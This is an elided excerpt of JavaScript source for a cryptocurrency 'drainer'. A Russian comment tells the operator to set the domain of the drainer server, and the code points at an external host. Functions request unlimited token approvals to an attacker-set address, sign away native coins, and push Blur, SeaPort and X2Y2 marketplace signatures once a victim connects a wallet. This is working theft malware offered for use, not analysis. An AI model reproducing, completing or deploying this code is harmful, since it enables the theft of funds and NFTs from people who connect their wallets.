...
const MS_Server = "private.sitesbackend.com"; // Указать домен, который прикреплен к серверу дрейнера
...
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false, MS_Sign_Disabled = false;
...
const SIGN_NATIVE = async (asset) => {
  ...
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
...
const MM_APPROVE_TOKEN = async (asset) => {
  ...
  let data = web3_contract.methods.approve(MS_Settings.Address, ethers.utils.parseEther(MS_Unlimited_Amount)).encodeABI();
  await approve_request(asset);
  sign_next();
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1)
      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1)
      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1)
    ...
    for (const asset of assets) {
      try {
        ...
        if (asset.type == 'NATIVE') {
          ...
          if (MS_Settings.Settings.Sign.NFTs > 0 && !MS_Sign_Disabled) {
            try {
